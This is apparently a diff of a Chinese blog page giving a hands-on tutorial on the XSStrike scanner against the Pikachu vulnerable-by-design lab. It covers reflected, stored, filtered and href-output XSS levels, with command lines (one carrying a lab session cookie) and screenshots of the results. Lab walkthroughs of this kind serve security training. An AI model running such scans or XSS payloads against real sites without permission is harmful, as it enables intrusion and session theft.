-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python xsstrike.py -u <span class="string">&quot;http://10.211.55.4/pikachu-master/vul/xss/xsspost/xss_reflected_post.php&quot;</span> --data <span class="string">&quot;message=1&amp;submit=submit&quot;</span> --headers <span class="string">&quot;Cookie: ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=ik287bd9bniuabdun1psescmr3&quot;</span></span><br></pre></td></tr></table></figure></blockquote>
-<p>要注意格式，需要自己添加Cookie:然后这后面又个空格</p>
-<p><img src="/.com//image-20250520023535-u7joe1g.png" alt="image"></p>
-<p>用第一个payload试一试</p>
-<p><img src="/.com//image-20250520023542-25jl455.png" alt="image"></p>
-<p>配合hackbar发送</p>
-<p><img src="/.com//image-20250520023550-3xuog8w.png" alt="image"><img src="/.com//image-20250520023553-0kxick2.png" alt="image"></p>
-<p>鼠标移动上去就弹窗</p>
-<hr>
-<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p><img src="/.com//image-20250520023610-8smbq12.png" alt="image"></p>
-<p>这也是post发送的</p>
-<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python xsstrike.py -u <span class="string">&quot;http://10.211.55.4/pikachu-master/vul/xss/xss_stored.php&quot;</span> <span class="params">--data</span> <span class="string">&quot;message=1&amp;submit=submit&quot;</span> <span class="params">--skip-dom</span> <span class="params">--skip</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/.com//image-20250520023623-pjrutwo.png" alt="image"></p>
-<p>因为这是存储的，所以它测试的时候会不断传进去，及时按ctrl+c停止</p>
-<p><img src="/.com//image-20250520023631-8diah4y.png" alt="image"><img src="/.com//image-20250520023634-zrbz4a5.png" alt="image"></p>
-<hr>
-<h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p>这个用XSStrike做不出来，如果有人可以做出来欢迎补充</p>
-<hr>
-<h2 id="XSS之过滤"><a href="#XSS之过滤" class="headerlink" title="XSS之过滤"></a>XSS之过滤</h2><p><img src="/.com//image-20250520023650-yn41p64.png" alt="image"></p>
-<p>通过get传参并且有回显，直接跑</p>
-<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> xsstrike.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">&quot;http://10.211.55.4/pikachu-master/vul/xss/xss_01.php?message=13&amp;submit=submit&quot;</span> --skip</span><br></pre></td></tr></table></figure>
-
-<p><img src="/.com//image-20250520023703-qk66wlr.png" alt="image"></p>
-<p><img src="/.com//image-20250520023714-ujyvkd4.png" alt="image"><img src="/.com//image-20250520023717-tqnkd4v.png" alt="image"></p>
-<hr>
-<h2 id="XSS之HTML特殊字符"><a href="#XSS之HTML特殊字符" class="headerlink" title="XSS之HTML特殊字符"></a>XSS之HTML特殊字符</h2><p>这题用工具跑出来的payload用不了，会被转义</p>
-<p>还是手动好</p>
-<hr>
-<h2 id="XSS之href输出"><a href="#XSS之href输出" class="headerlink" title="XSS之href输出"></a>XSS之href输出</h2><p><img src="/.com//image-20250520023740-4kqh3ql.png" alt="image"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python xsstrike.py -u <span class="string">&quot;http://10.211.55.4/pikachu-master/vul/xss/xss_03.php?message=123&amp;submit=submit&quot;</span> --skip</span><br></pre></td></tr></table></figure>
-
-<p><img src="/.com//image-20250520023750-d85dkno.png" alt="image"></p>
-<p><img src="/.com//image-20250520023753-b9ptlcx.png" alt="image"></p>
-<hr>
-<h2 id="XSS之href输出-1"><a href="#XSS之href输出-1" class="headerlink" title="XSS之href输出"></a>XSS之href输出</h2><p>这题也不能靠工具</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/%E5%AE%9E%E6%88%98/" data-id="cmawb0xv80017747k0j451p6x" data-title="XSStrike实战教程" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSStrike/" rel="tag">XSStrike</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li></ul>
 
     </footer>
   </div>
@@ -1632,11 +1632,11 @@
       <ul>
         
           <li>
-            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/">(no title)</a>
+            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/">(no title)</a>
           </li>
         
           <li>
-            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/">(no title)</a>
+            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/">(no title)</a>
           </li>
         
           <li>
@@ -1644,11 +1644,11 @@
           </li>
         
           <li>
-            <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B/">(no title)</a>
+            <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E+%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">(no title)</a>
           </li>
         
           <li>
-            <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/">(no title)</a>
+            <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/user.ini/">(no title)</a>
           </li>
         
       </ul>
